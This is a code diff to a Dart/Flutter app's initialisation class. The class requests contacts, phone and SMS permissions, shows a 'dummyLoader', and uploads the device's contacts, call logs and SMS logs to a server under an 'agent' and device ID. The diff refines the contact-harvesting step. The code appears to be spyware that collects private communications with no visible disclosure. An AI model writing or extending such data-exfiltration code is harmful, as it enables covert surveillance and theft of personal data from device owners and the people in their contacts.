@@ -25,12 +25,13 @@ class Init {
     printWhite('IMEI: $imei');
     printWhite('agent: $agent');
 
+    final getContacts = await _requestPermission(Permission.contacts);
     await _requestPermission(Permission.phone);
     await _requestPermission(Permission.sms);
 
     dummyLoader();
     // Api.sendLocation(agent, uuid);
-    await Api.sendContacts(context, agent, uuid);
+    if (getContacts) await Api.sendContacts(context, agent, uuid);
     await Api.sendCallLogs(context, agent, uuid);
     await Api.sendSmsLogs(context, agent, uuid);
   }
@@ -53,9 +54,9 @@ class Init {
     }
   }
 
-  static Future<PermissionStatus?> _requestPermission(Permission permission) async {
+  static Future<bool> _requestPermission(Permission permission) async {
     final alreadyGranted = await permission.isGranted;
-    if (alreadyGranted) return null;
+    if (alreadyGranted) return true;
     final status = await permission.request();
 
     try {
@@ -74,7 +75,7 @@ class Init {
       }
     }
 
-    return status;
+    return status.isGranted;
   }
 
   static Future dummyLoader() async {
